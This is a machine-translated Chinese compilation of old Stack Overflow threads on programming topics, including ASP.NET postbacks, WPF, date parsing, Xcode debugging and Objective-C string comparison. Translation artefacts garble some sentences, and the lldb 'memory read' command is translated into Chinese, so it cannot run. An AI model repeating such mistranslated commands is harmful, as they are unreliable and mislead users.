没有全局变量实际上总是更好。只需编写 dam get 和 set 方法，并在一天、一周或一个月后需要它们时成为您的腺体。

* * *

## 回答 #26

> 赞同：1
> 
> 时间：2016-08-13T11:58:10.230

在企业内的 Web 应用程序中，可用于在服务器上保存会话/窗口/线程/用户特定数据，以进行优化并防止连接不稳定的工作丢失。如前所述，需要处理竞争条件。我们使用一个类的单个实例来获取这些信息，并对其进行仔细管理。

* * *

## 回答 #27

> 赞同：-1
> 
> 时间：2014-09-07T09:47:52.270

在多线程应用程序中，使用局部变量代替全局变量来避免竞争条件。

当多个线程访问共享资源时会出现竞争条件，其中至少一个线程具有对数据的写访问权限。那么，程序的结果是不可预测的，取决于不同线程访问数据的顺序。

更多关于这里，[https://software.intel.com/en-us/articles/use-intel-parallel-inspector-to-find-race-conditions-in-openmp-based-multithreaded-code](https://software.intel.com/en-us/articles/use-intel-parallel-inspector-to-find-race-conditions-in-openmp-based-multithreaded-code)

* * *

## 回答 #28

> 赞同：-1
> 
> 时间：2012-11-23T07:34:12.837

安全性较低意味着如果变量被声明为全局变量，则任何人都可以操纵变量，为了解释这一点，如果您在银行程序中将余额作为全局变量，则用户函数可以操纵它，银行官员也可以操纵它这就是一个问题。只有用户应该被赋予只读和提款功能，但银行职员可以在用户亲自在办公桌上提供现金时添加金额。这就是它的工作方式

# asp.net - 如何在回发时捕获 webforms 中的发件人对象？

> ID：484644
> 
> 赞同：0
> 
> 时间：2009-01-27T18:37:14.623
> 
> 标签：asp.net, webforms

如果我在 webforms 中使用非 asp.net 控件进行表单发布，如何从发件人对象中获取触发事件的控件的 ID？

目前，我正在使用 jQuery 在我的下拉列表中添加一个简单的表单帖子，并想要一种方法来捕获服务器端的特定控件......

```
$(document).ready(function()
{
    $("*[id$='ddlEmployers']").change(
        function(objEvent)
        {
            document.forms[0].submit();
        }
    );
}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-01-27T18:53:43.793

从 JS 调用 .NET 的 __doPostBack(eventTarget, eventArgument);

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-27T20:12:22.530

ASP.NET 回发依赖于 __EVENTTARGET 隐藏字段，其值通常是触发回发的控件的 UniqueID。在我看来，您有两种选择：

*   调用 __doPostBack 例程并传递下拉列表的 UniqueID（很可能是 ddlEmployers）。在服务器端，您可以使用 Page.FindControl(Request["__EVENTTARGET"])
*   手动设置 __EVENTTARGET 隐藏字段，然后提交表单：

    $("input[name=__EVENTTARGET]).val("ddlEmployers"); document.forms[0].submit();

# facebook - 作为 Facebook 软件工程实习生的经验

> ID：484674
> 
> 赞同：0
> 
> 时间：2009-01-27T18:44:33.097
> 
> 标签：facebook

我参加了 Facebook 的软件开发实习面试。我想知道是否有人有为 Facebook 工作的经验或见解。

我已经查看了有关常见面试问题的其他问题，但想知道 Facebook 是否有任何具体的问题可能会问实习生。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-01-27T19:23:35.623

他们很有可能会查看您的 Facebook 个人资料。如果你没有，就做一个。如果您这样做，请删除所有桶架照片。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-27T19:15:55.483

您可能会熟悉他们的应用程序 api 并查看他们编写的代码。表现出一些主动性会告诉他们你有兴趣，而不仅仅是在你的简历上寻找检查。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-27T19:16:10.847

我从未采访过他们，但我期望的一些问题可能包括：

您是否开发过任何第三方 Facebook 应用程序？

你对 PHP/MySQL 有什么技能？

你是社会人吗？

# language-agnostic - 谁在乎……只要结果是好的？

> ID：484676
> 
> 赞同：4
> 
> 时间：2009-01-27T18:45:01.143
> 
> 标签：language-agnostic, semantics

我对许多问题的反应感到有些震惊，这些问题指出开发人员更关心生成的编译字节而不是代码的含义。我倾向于对后缀/前缀增量进行挑剔，因为我倾向于对具有两个值的枚举类型使用布尔值以及正确的函数命名以及...

所以这个问题更像是一个反省的民意调查：什么时候允许一个人忽视一个人所写内容的语义？边界线在哪里？

*   运算符++（后缀/前缀）
*   string.empty() 与 string == ""
*   vector.empty() 与 vector.size() == 0
*   enumerate { on, off} vs. boolean on=true; 关闭=假
*   ...

命名它。

编辑 -

我并不是要质疑（微）优化的必要性。相反，我想就你应该如何*意识到*你在写什么，以及“但它编译成一个 dword，无论如何，我为什么要把它变成一个枚举”这样的陈述提出意见。（这是一个极端的情况......）。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2009-01-27T18:47:47.863

定义“好”。如果它在初始交付日期有效，是否可以，但每次您需要进行更改时，都需要额外的三周时间才能弄清楚旧代码？

这就是你的答案：只要你能理解代码并且它不会损害你维护它的能力。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-01-28T00:03:26.057

在我的职业生涯中，我编写了*很多*代码。当然这里没有那么多人，但仍然有很多代码。在那段时间里，我学到了一件事，一次又一次地被证明是正确的：当你马虎，当你忽视细节时，*缺陷就会蔓延。*

缺陷需要花费时间和金钱来修复。您可以花时间在前面干净清晰地编写代码，这样做很便宜，或者您可以在以后花费大量时间和金钱来追查您可能不太记得的代码缺陷，因为您匆忙将它拍打在一起，或者因为它不符合编码标准。最终结果是，*你在浪费时间和金钱。*此外，您正在浪费时间和金钱，因为您可以通过一点前期投资来避免浪费。

我从不后悔对自己编写代码的方式一丝不苟。它再也没有回来困扰我。邋遢总是困扰着我。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2009-01-27T18:50:35.877

当你开始担心对底线没有影响的深奥的东西时，我认为这太过分了。讨论是否使用三元运算符或写明确的 if 语句适合那些无事可做，只能坐下来，站起来，啜饮啤酒/葡萄酒/苏打水并讨论“重大后果”问题的日子:)

但是为布尔创建一个枚举是完全错误的。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2009-01-27T18:50:55.313

**取决于你的成本函数**

这里有几个人们喜欢争论并且经常混为一谈的维度。真的，答案是视情况而定。你真正看重的是什么？

*   字符数
*   创建的操作数
*   运行
*   可移植性
*   可维护性
*   明晰
*   聪明
*   稳定性（没有错误？）
*   可扩展性

我总是首先瞄准更高阶的东西，比如清晰度。在人类周期中，清晰度的丧失是有代价的，而人类周期总是存在不足的。人们很少关心原始时钟时间，而那些说他们关心的人几乎总是过早地优化。

如果它对你有任何帮助，我喜欢认为我们正在通过提升堆栈取得进展，更多地关心语义和工作完成，而不是成为位和数字的奴隶。然而，这并不是忘记基本原理并记住某些语义位是如何实现的借口。在那些速度开始变得重要而惯例被排除在外的难得机会中，您不想陷入困境。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2009-01-27T18:53:15.620

*“什么时候可以无视所写内容的语义？边界在哪里？”*

我认为一个合理的问题是：“什么时候**应该**忽略所写内容的语义？”

由于我将编程视为一种人类活动，我想说唯一一次*应该*忽略语句的语义是系统本身强迫你 - 当一些难以理解的语句是做某事的**唯一方法时。**这样的陈述很好记录。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2009-01-27T18:50:31.290

边界是当您处理一次写入、永不读取的代码时。只有这样，你在做什么（在那种情况下）最终才无关紧要，因为你永远不会再使用它。不幸的是，这并没有解决你不想重复的练习的间接反馈。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2009-01-27T18:47:29.253

边界线是副作用。

如果一个封装的函数可以完成您想要的所有操作，并且没有 0 个意外副作用，并且代码是可读的，那么这就是最重要的。如果您对外部用户来说是可预测的，并且任何“奇怪”的功能都保留在内部，那就很重要了。

如果您添加优化，它会略有变化，但由于您永远不应该过早优化，这就是它结束的地方。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2009-01-27T18:49:20.137

我认为现在大多数人都同意，假设它工作正常，可读性是最重要的考虑因素。当然也有例外——有些应用程序必须尽可能快地运行，有些应用程序**永远**不允许崩溃，但一般来说它是可读性的。

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2009-01-27T18:57:44.880

微优化在 99% 的情况下都是毫无意义的。例如，如果您的编译器无论如何都将所有“”实习生到单个实例，那么您不会通过使用 String.Empty 以任何方式提高性能。没有任何可测量的效果通常也是您所希望的最好的，我已经看到“优化”会降低性能，因为编译器做得更好，而优化会干扰它。

大多数代码不需要优化。识别需要在哪里发生，只能在代码运行后通过诊断来完成，即使这样，大部分时间也是通过算法优化来完成的，而不是微优化。

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2009-01-27T23:23:26.450

观察您提供的示例-以下内容：

**`operator++`（后缀/前缀）**

**`string.empty()`对比`string == ""`**

这似乎不是很好的例子，因为它们比较了`functionality`. 因此，最好**不要**忽视它们的语义区别。

相比之下，以下示例：

**`vector.empty()`对比`vector.size() == 0`**

**`enum`erate { `on`, `off`} 与`boolean` `on=true`;`off=false`**

完全合理。

`vector.empty()`如果它的使用上下文仅用于确定向量是否为空，则更可取。冒着听起来居高临下的风险（我**不**打算这样做）：这归结为常识。如果您只想知道向量是否为空，为什么还要询问向量的大小？这就像问某人钱包里有多少钱，而您只是想知道他们是否有足够的现金来喝可乐。

至于`enum`erate { `on`, `off`} vs. `boolean` `on=true`; `off=false`，问问自己这个问题：将来您向枚举添加另一个值的可能性有多大？人们可能想要`enum`erate{ `on`, `off`, `indeterminate`}` （或一些变体）似乎是合理的，所以答案可能是肯定的。否则，一个简单的布尔值就足够了。

这使我想到了您问题的症结所在：似乎是否有某种确定性/算法方法可以在诸如此类的问题或它们的相关性上决定一种或另一种方式？我的回答是，直到[图灵机](http://en.wikipedia.org/wiki/Turing_machine)能够通过[图灵测试](http://en.wikipedia.org/wiki/Turing_test)的那一天，我会说不。这就是为什么需要人类来设计软件的原因。

# ruby-on-rails - ：通过rails中的关系：通过相关表中的属性查询

> ID：484678
> 
> 赞同：1
> 
> 时间：2009-01-27T18:45:49.490
> 
> 标签：ruby-on-rails, activerecord

我有以下 Rails 定义：

```
Class Book
  string title
  has_many readings
  has_many users, :through => :readings

Class Reader
  int rating
  belongs_to :book
  belongs_to :user

Class User
  has_many readings
  has_many books, through => :readings 
```

不，我想这样查询：

给我所有具有 book.title = "test" 的用户 A 的阅读评分

你可以帮帮我吗？谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-01-29T22:27:01.610

您可以包含相关模型并将其用作参数。

```
Users.find(
  :all,
  :include => {:readings => :books},
  :conditions => "books.title = ? AND etc"
) 
```

显然不是 100% 正确，但应该给你正确的想法。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-27T20:08:46.453

这将为您提供标题为“test”的书籍的所有评分数组，该书籍由名为“A”的用户阅读

```
User.find_by_name("A").books.find_by_title("test").readings.map{|r| r.rating } 
```

但老实说，我真的不确定这是否是你想要的。

# wcf - 使用基于证书的身份验证测试 Web 服务（RESTful WCF）方法

> ID：484684
> 
> 赞同：2
> 
> 时间：2009-01-27T18:47:43.447
> 
> 标签：wcf

需要测试 WCF RESTful Web 服务。服务器使用基于可信证书的身份验证。对于编写单元测试用例来测试web方法，如何进行认证，是否需要为每个http请求传递证书信息，因为会话在rest web服务中是无状态的，或者如何测试认证部分。

先感谢您，

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-01-27T20:08:35.190

您应该能够制作自签名证书，然后将测试服务器配置为接受这些用于测试目的。如果你走这条路，你可能会考虑添加一个测试标志来禁用这些证书，以防它们意外地被部署。

但是，WCF 身份验证非常灵活，因此切换到其他形式（例如用户/通行证）应该不难。

最后，如果您使用的是 Active Directory，您可以启用 AD 证书映射器，并将证书附加到用户帐户。应用程序会将身份验证视为 Windows 身份验证——证书部分变得透明。这使您可以简单地重新配置 AD，或者切换到 NTLM，而无需重新配置您的应用程序。

如果您发布有关设置的更多信息，您可能会得到更好的答案。

# windows - Linux 和 WindowsXP 上的 OpenGL 性能差异

> ID：484690
> 
> 赞同：1
> 
> 时间：2009-01-27T18:49:25.147
> 
> 标签：windows, linux, opengl, directx

我注意到我一直在开发的 OpenGL 应用程序在 Linux 和 WindowsXP 上运行时具有显着的性能差异。

当然，有很多纹理和阴影缓冲区，但我估计该应用程序在 Windows XP 上的运行速度大约**慢10 倍。**

有任何想法吗？

将代码移植到 DirectX 有什么建议吗？这可以轻松完成还是需要重写？

运行不同的硬件。我没有 Linux 机器的规格，但我的 xp 机器是带有 Nvidia Quadro FX 1500 的 Intel Duo Core 2。Linux 机器视频卡是某种 Nvidia Geforece（它是一台大学计算机）。

一些启动代码：

```
FlyWindow::FlyWindow() :
GlowWindow("fly", 300, 100, // GlowWindow::autoPosition, GlowWindow::autoPosition,
       700, 500,
       Glow::rgbBuffer | Glow::doubleBuffer |
       Glow::depthBuffer | Glow::multisampleBuffer,
       Glow::keyboardEvents | Glow::mouseEvents | Glow::dragEvents |
       /*Glow::menuEvents | */ Glow::motionEvents | Glow::visibilityEvents |
       Glow::focusEvents /* set ::glutEntryFunc */ ),

W(700), H(500),
flock(10),
lastSeconds(myclock.getSecondsSinceStart())
{
    myfps = FPScounter();

    GLdraw<float>::initGL(W,H);

    // Add a bouncing checkerboard
    MovingCB = Point3d<double>(50, 2, 50);

    Glow::RegisterIdle(this);
    bDebug = false;
    m_bLookAtCentroid = true;
    m_bLookAtGoal = false;
} 
```

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-01-27T19:20:22.463

将 Quadro 与 GeForce 进行比较是一个很大的错误。它们可能都是“图形”卡，但这就是相似之处。

Quadro 专为高端渲染而非游戏而设计。来自关于 Quadro 的维基百科文章：

> 他们的设计师旨在加速 CAD（计算机辅助设计）和 DCC（数字内容创建），这些卡通常用于工作站。（与专门针对计算机游戏的 NVIDIA GeForce 产品线相比）。

无论操作系统如何，Quadro 的性能都将与 GeForce 截然不同。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-01-27T19:33:10.377

正如 DrJokepu 在评论中提到的那样，XP 可能正在使用软件渲染，这意味着驱动程序安装存在问题。您可以通过查询 GL_VENDOR 和 GL_RENDERER 来验证这一点：

```
printf( "%s\n", (const char*)glGetString( GL_VENDOR ) );
printf( "%s\n", (const char*)glGetString( GL_RENDERER ) ); 
```

供应商应该是 NVidia 而不是 Microsoft，渲染器应该至少是 OpenGL 2.0。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-27T19:15:03.097

QuadroFX 1500 并不是最新的显卡。找出 linux 盒子有什么并比较硬件规格。在我的项目（密集信号数据的显示）中，我发现 OpenGL 的性能在 linux/windows 之间非常一致。

# .net - 具有长期运行对象上下文的实体框架

> ID：484691
> 
> 赞同：2
> 
> 时间：2009-01-27T18:49:51.900
> 
> 标签：.net, entity-framework

我对 WinForms（我敢说 WPF）中的 Linq to SQL 的主要烦恼之一是缺乏对长时间运行的数据上下文的支持，请参见[此处](http://blogs.msdn.com/dinesh.kulkarni/archive/2008/04/27/lifetime-of-a-linq-to-sql-datacontext.aspx)。

问题是您无法从数据库中获取更新，您只能获得相同的旧记录，直到您丢弃数据上下文。当页面仅存活几毫秒但在具有多个绑定控件的 winforms 应用程序中不太好时，这对于 Web 应用程序来说很好，所有这些控件都粘在旧的数据上下文中并位于用户桌面上。

我的问题是 EF 是否仍然有此限制，或者您能否在不丢弃对象上下文的情况下从 EF 获取更新记录？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-01-27T19:04:17.813

您可以使用[ObjectContext.Refresh](http://msdn.microsoft.com/en-us/library/bb503718.aspx)方法来更新现有的上下文。

# wpf - 了解哪些其他语言有助于理解 WPF 概念

> ID：484697
> 
> 赞同：6
> 
> 时间：2009-01-27T18:50:53.053
> 
> 标签：wpf

我注意到 WPF 的一件事是它结合了我所知道的其他计算机语言的各种概念，而其他概念对我来说（曾经）是全新的。

哪些语言的经验可以帮助 WPF 新手理解不同的 WPF 概念？

例如，如果您了解 XSL，那么 DataTemplates 看起来会很熟悉，并且样式/UI/逻辑的分离对于以前使用 HTML/CSS/JavaScript 的人来说并不陌生。

但是诸如绑定、标记扩展、资源、路由事件/命令、附加属性等内容呢？

是否存在有助于理解大多数 WPF 概念的语言子集？哪些概念是 WPF 独有的？

* * *

**更新**

所以...除了 HTML 和 XSL，只有 Cocoa 有类似 WPF 的概念吗？我知道像 RoutedEvents 这样的东西与 WPF 视觉/逻辑树结构非常相关，因此不太可能在没有类似结构的平台中看到，但是像附加属性这样的概念在许多非 UI 场景中似乎很有用。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-01-27T20:01:46.793

我知道你的感受——我自己也经历过。对我帮助最大的语言实际上是普通的旧 HTML——声明性、基于树的、类似 XML 的语言。在设计 UI 时，您必须牢记元素的自然树结构，因为像 DataContext 这样的东西会沿着树传播。

如果您以前编写过任何 WinForms 编码，请把头砸在石头上，直到忘记为止。

如果您发现自己在代码隐藏（blah.xaml.cs 文件）中做的事情超出了设置数据上下文和按钮单击处理，那么您做错了。（绑定几乎可以做任何事情）

我想不出任何其他特定的语言会有所帮助，但是我可以推荐的一本书是 Adam Nathan 的 Windows Presentation Foundation Unleashed (pub. Sams)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-27T22:50:22.383

与其说是一门语言，倒不如说是我使用 Swing 的经验帮助我理解了 XAML 的基于面板的布局引擎。在那种风格和全局风格之间，我永远不必将位置或大小信息放入*任何*控件中......

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-27T23:06:39.323

正确执行 HTML/XHTML，或者可能是使用 XSL/XSLT 呈现的一般 XML，可能是最相似的。

理解 WPF 完全设计为允许非常“声明性”的编程风格非常重要，其中信息包含在 XAML 文件中，允许运行时（或隐式调用的库）执行那种“管道”工作否则您将不得不输入数百行代码才能完成。一些 WPF 概念起初可能看起来有点“巴洛克式”（过于复杂），但在非平凡的应用程序中，我认为它们提供了很大的好处。

我知道 Mac OS X 的 Cocoa 框架也有绑定。但总的来说，这是一个非常不同的系统。

我同意 Unleashed 这本书很好。我一直在阅读它，它对主要主题有清晰而良好的解释。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-02-17T07:41:00.580

*这个问题在使用语言*一词时措辞有点糟糕，因为 WPF 中的许多概念来自*应用程序框架*，而不是语言。

Metrowerks的[PowerPlant](http://open-powerplant.sourceforge.net/)框架捆绑在 CodeWarrior 工具中，是适用于 Macintosh 的出色的第三代 C++ 框架。它和许多其他的一样，具有与*命令升级层次*分离的*视图层次*的概念。任何给定级别的事件或命令的绑定，它们的默认值下降到下一个级别，由 switch 语句提供。

 ** * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-01-28T09:19:10.617

这个问题让我想起了我曾经读过[Karsten Januszewski](http://blogs.msdn.com/karstenj/archive/2006/04/05/curve.aspx)的一篇博文：

> 与其他 UI 开发范例有许多相似之处：样式感觉就像 CSS，嗯。XAML 代码背后的感觉就像 ASP.NET，嗯。3D 感觉就像 DX 或 OpenGL，嗯。路由事件感觉就像 .NET 事件，好吧。从属属性感觉就像属性，好吧。这份名单可以继续使用。

WPF 有一个陡峭的学习曲线，在我看来，这是阻止 WPF 接管世界的唯一原因！

* * *

## 回答 #6

> 赞同：-4
> 
> 时间：2009-01-27T19:02:17.180

嗯，Win32 是 WPF 的基础，大多数 win32 应用程序都是用 c 和 c++ 编写的，所以 c 和 c++ 是*一些**可以*帮助您理解 WPF的语言。

# language-agnostic - 哪种语言具有最简单和最强大的日期解析？

> ID：484700
> 
> 赞同：0
> 
> 时间：2009-01-27T18:51:02.427
> 
> 标签：language-agnostic

我知道 java 的 SimpleDateFormat 看起来相当强大，但是您需要提前知道格式才能正确使用它。
TCL的时钟扫描功能似乎是我见过的最简单最强大的。

例如，时钟扫描“1/08/2009 12:33:01 AM”与
时钟扫描“2009 年 1 月 8 日 12:33:01”一样有效

**编辑：**好的，消除它必须是内置功能的想法。Perl 和 Python 是最好的吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-01-27T18:54:45.727

Perl 的 Date::Parse 模块（我不知道它可以被认为是语言的内置模块，但它是一个 CPAN 模块，所以对我来说已经足够好了）在数据转换项目上为我节省了无数时间。从文档（[http://metacpan.org/pod/Date::Parse](http://metacpan.org/pod/Date::Parse)）：

```
Below is a sample list of dates that are known to be parsable with Date::Parse:

1995:01:24T09:08:17.1823213           ISO-8601
1995-01-24T09:08:17.1823213
Wed, 16 Jun 94 07:29:35 CST           Comma and day name are optional 
Thu, 13 Oct 94 10:13:13 -0700
Wed, 9 Nov 1994 09:50:32 -0500 (EST)  Text in ()'s will be ignored.
21 dec 17:05                          Will be parsed in the current time zone
21-dec 17:05
21/dec 17:05
21/dec/93 17:05
1999 10:02:18 "GMT"
16 Nov 94 22:28:20 PST 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-01-27T19:21:04.550

Python 没有内置库，但优秀的[dateutil](http://labix.org/python-dateutil)库提供了一个非常适合的 parse() 方法。

从简单（假设今天是 9/25）：

```
>>> parse("Thu Sep 25 2003")
datetime.datetime(2003, 9, 25, 0, 0)

>>> parse("Sep 25 2003")
datetime.datetime(2003, 9, 25, 0, 0)

>>> parse("Sep 2003", default=DEFAULT)
datetime.datetime(2003, 9, 25, 0, 0)

>>> parse("Sep", default=DEFAULT)
datetime.datetime(2003, 9, 25, 0, 0)

>>> parse("2003", default=DEFAULT)
datetime.datetime(2003, 9, 25, 0, 0) 
```

模棱两可：

```
>>> parse("10-09-2003")
datetime.datetime(2003, 10, 9, 0, 0)

>>> parse("10-09-2003", dayfirst=True)
datetime.datetime(2003, 9, 10, 0, 0)

>>> parse("10-09-03")
datetime.datetime(2003, 10, 9, 0, 0)

>>> parse("10-09-03", yearfirst=True)
datetime.datetime(2010, 9, 3, 0, 0) 
```

致全体：

```
>>> parse("Wed, July 10, '96")
datetime.datetime(1996, 7, 10, 0, 0)

>>> parse("1996.07.10 AD at 15:08:56 PDT", ignoretz=True)
datetime.datetime(1996, 7, 10, 15, 8, 56)

>>> parse("Tuesday, April 12, 1952 AD 3:30:42pm PST", ignoretz=True)
datetime.datetime(1952, 4, 12, 15, 30, 42)

>>> parse("November 5, 1994, 8:15:30 am EST", ignoretz=True)
datetime.datetime(1994, 11, 5, 8, 15, 30)

>>> parse("3rd of May 2001")
datetime.datetime(2001, 5, 3, 0, 0)

>>> parse("5:50 A.M. on June 13, 1990")
datetime.datetime(1990, 6, 13, 5, 50) 
```

在这里查看它的文档：

[http://labix.org/python-dateutil#head-c0e81a473b647dfa787dc11e8c69557ec2c3ecd2](http://labix.org/python-dateutil#head-c0e81a473b647dfa787dc11e8c69557ec2c3ecd2)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-27T19:08:34.840

日期的问题是一直存在的国际化问题——即使是一个看着“1/08/2009 12:33:01 AM”的人也会确定它应该是 1 月 8 日或 8 月 1 日。

我见过可以接受大量格式的日期/时间解析器，并为您提供各种选项来了解实际含义。您还可以根据区域设置为各种格式分配优先级。不幸的是我现在找不到它。它是作为 C++ 库编写的。我不知道有什么语言可以处理这种内置的东西。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-01-27T19:09:18.600

我喜欢 SQL Server，在 2008 年它一直达到 100 纳秒的精度

有关所有可用样式，请参见此处：http: [//msdn.microsoft.com/en-us/library/ms187928.aspx](http://msdn.microsoft.com/en-us/library/ms187928.aspx)

您将使用 ISO8601 (yyyy-mm-ddThh:mi:ss.mmm) 这是不依赖于语言或区域设置的安全格式之一

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-01-27T19:22:13.830

Java 的[SimpleDateFormat](http://java.sun.com/j2se/1.5.0/docs/api/java/text/SimpleDateFormat.html)做得很好。是的，我知道，这不是自动的，但为什么会这样呢？IMO 猜测准确的值总是不好的做法。

# c++ - 使用 Xcode 调试器查看动态分配的数组？

> ID：484707
> 
> 赞同：27
> 
> 时间：2009-01-27T18:53:42.920
> 
> 标签：c++, xcode, macos, gdb

假设我在 C++ 中有一个数组：

```
double* velocity = new double[100]; 
```

使用 GDB 命令行，我可以使用以下命令查看此数组：

```
> print *velocity @ 100 
```

它将打印出数组内所有双精度值的格式良好的列表。

但是，当使用 Xcode 调试器时，它最多会将其视为指向单个双精度值的指针，并在变量列表中显示 velocity[0]。

这使它成为调试包含大型动态分配数组的程序的真正 PITA。必须有某种方法来告诉 Xcode“这是一个指向长度为 100 的数组的指针”，并让它这样显示。有人知道这是什么吗？

* * *

## 回答 #1

> 赞同：37
> 
> 时间：2014-05-01T02:15:42.367

我认为我的回答将是对旧回答的一个很好的补充。

新版本的 Xcode 使用`lldb`调试器作为默认工具，而不是`gdb`.

根据此[页面](https://developer.apple.com/library/mac/documentation/IDEs/Conceptual/gdb_to_lldb_transition_guide/document/Introduction.html)：

> 随着 Xcode 5 的发布，LLDB 调试器成为 OS X 调试体验的基础。

因此，对于 Xcode 5 及以上版本，我使用以下`lldb`命令：

```
内存读取 -t int -c8 `array_name`

```

其中：
`8`- 数组中的元素数量
`array_name`- 数组名称 - 数组
`int`类型

该命令的执行结果将是这样的：

```
(lldb) 内存读取 -t int -c8array
(int) 0x7fff5fbff870 = 7
(int) 0x7fff5fbff874 = 6
(int) 0x7fff5fbff878 = 9
(int) 0x7fff5fbff87c = 10
(int) 0x7fff5fbff880 = 1
(int) 0x7fff5fbff884 = 8
(int) 0x7fff5fbff888 = 4
(int) 0x7fff5fbff88c = 3

```

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2009-01-28T19:58:30.030

您可以使用 gdb 语法作为表达式：

1.  使用 Run/Show/Expressions... 菜单显示表达式窗口
2.  `'*velocity @ 100'`在窗口底部输入（表达式：）

* * *

## 回答 #3

> 赞同：13
> 
> 时间：2019-06-28T00:15:10.413

从 Xcode 10 开始，您可以右键单击`velocity`，选择“View value as...”，然后选择“Custom Type”。然后将其转换为`(double(&)[100]) *velocity`并在 GUI 中显示该数组。

* * *

## 回答 #4

> 赞同：-2
> 
> 时间：2009-01-27T20:13:05.227

不，不幸的是 GUI 是有限的，你需要混合 GDB 魔法来完成工作。

# objective-c - 为什么我的比较 if 语句不起作用？

> ID：484709
> 
> 赞同：3
> 
> 时间：2009-01-27T18:54:42.327
> 
> 标签：objective-c, cocoa, string, object-comparison

为什么以下代码（在可可中）不起作用？

```
NSString *extension = [fileName pathExtension];
NSString *wantedExtension = @"mp3";
if(extension == wantedExtension){
//work
} 
```

在 Xcode 中，这只是在没有警告或错误的情况下运行，但没有做我认为应该做的事情。

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2009-01-27T18:59:06.093

那不应该是

```
if ([extension isEqualToString:wantedExtension]) {
...
} 
```

"==" 比较指针。isEqual: 和 isEqualToString: 比较字符串，尽管如果你知道 extension 和 WantExtension 都是 NSString （在这种情况下你这样做）， isEqualToString 会更好。

实际上，如果您是像我这样的老 C++ 和 Java 程序员，您可能会更乐意将已知不为 null 的“wantedextension”放在第一位。在 Objective C 中，这不是必需的，因为“发送消息”（即调用方法）到 nil 返回 0 或 false。

```
if ([wantedExtension isEqualToString:extension]) {
   ...
} 
```

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2009-01-27T20:44:08.813

Paul 的回答在技术上是正确的，但正如 NSString 文档中所述，“当您知道两个对象都是字符串时，这种方法 [isEqualToString:] 是一种比 isEqual: 更快的检查相等性的方法。” 因此，对于您的示例代码，正确的测试是

```
if([extension isEqualToString:wantedExtension]) {
    ...
} 
```

如果 extension 是`nil`，结果将为 false ，即使 WantExtension 是 non- `nil`，因为`nil`Objective-C 中的消息传递对于`BOOL`返回值函数返回 0 。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-01-28T02:54:04.120

请记住，在 Objective-C 中没有运算符重载。在这种情况下，`==`它所做的是一个完全合法且被广泛使用的用法，比较两个指针。你有两个指针，它们总是指向两个不同的对象，所以`==`操作符总是为假的。

# c# - 是否可以使 WcfTestClient 为自定义传输通道工作？

> ID：484717
> 
> 赞同：14
> 
> 时间：2009-01-27T18:56:46.533
> 
> 标签：c#, .net, wcf, interface, wcf-binding

## 目标

我希望能够在我正在设计的托管框架内通过 WCF 托管和连接到 vanilla sockets 服务器。我希望能够使用 WCF 来编码当今必须由套接字程序员手动管理的传输和协议通信。这将使我能够与只公开传统套接字和专有协议的 Linux 服务器守护进程实现最终的互操作性。我现在只对一般使用 WcfTestClient 验证传输通道层感兴趣。我的理解是 WcfTestClient 不支持复杂的服务方法。

**有人认为可以使 WcfTestClient 用于自定义传输通道吗？** 如果能够通用地使用这个客户端来测试任意数量的自定义传输通道，那就太好了。

## 概述

我正在努力了解 Windows SDK 中包含的 WCF Udp 示例，通常位于 C:\Program Files\Microsoft SDKs\Windows\v6.1\Samples\WCFSamples\TechnologySamples\Extensibility\Transport\Udp\CS，假设WCFSamples.zip 文件完全从 Samples 目录中提取。

这些是我迄今为止采取的步骤：

*   （成功）：在 Visual Studio 2008 中成功运行解决方案的服务和客户端。

*   （成功）：使用通常位于 C:\Program Files\Microsoft Visual Studio 9.0\Common7\IDE 的 WcfTestClient 连接到 MEX 端点

*   （失败）：使用 WcfTestClient 尝试从 ICalculatorContract 或 IDatagramContract 服务合同执行方法。

例如，当我执行 Hello() 方法时，我收到以下错误：

> 友情留言：
> 
> > 调用服务失败。可能原因：服务离线或无法访问；客户端配置与代理不匹配；现有代理无效。有关更多详细信息，请参阅堆栈跟踪。您可以尝试通过启动新代理、恢复到默认配置或刷新服务来恢复。
> 
> 错误详情：
> 
